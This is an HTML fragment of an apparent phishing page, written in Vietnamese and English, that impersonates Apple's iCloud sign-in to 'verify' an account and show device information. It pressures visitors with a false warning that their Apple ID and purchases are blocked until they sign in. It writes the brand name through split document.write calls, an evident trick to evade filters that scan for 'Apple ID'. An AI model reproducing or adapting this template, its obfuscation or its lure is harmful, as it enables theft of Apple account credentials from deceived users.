			...
			<div id="content" class="content">
				<div class="grid2colc wrap">
					...
					<div class="column first sidebar">
						<h2>Vui lòng đăng nhập để xác thực iCloud <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT></h2>
						<p class="intro">
						  Vui lòng đăng nhập để xác thực iCloud và thấy thông tin thiết bị <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT> account information.</p>
						<h2>Bảo mật tài khoản iCloud</h2>
						<p class="intro">
						Vui lòng đăng nhập để xác thực iCloud và tìm thấy thông tin thiết bị						<br/><br/><b>You will be unable to use your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT> or make purchases until this process is completed.</b>
						</p>
						
					</div><!--/column-->

					<div class="column last">
					<h2>Đăng nhập để xác thực <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT>.</h2>
					<div class="formrow">
				...
				<div id="bot-nav">
					...
					<a type="submit" class="btn bigblue">
							<input class="btn bigblue" id="" onsubmit="return validateForm()" type="submit" value="Đăng nhập để xác thực" name="" />
						</a>					
					</div>	
					</div>
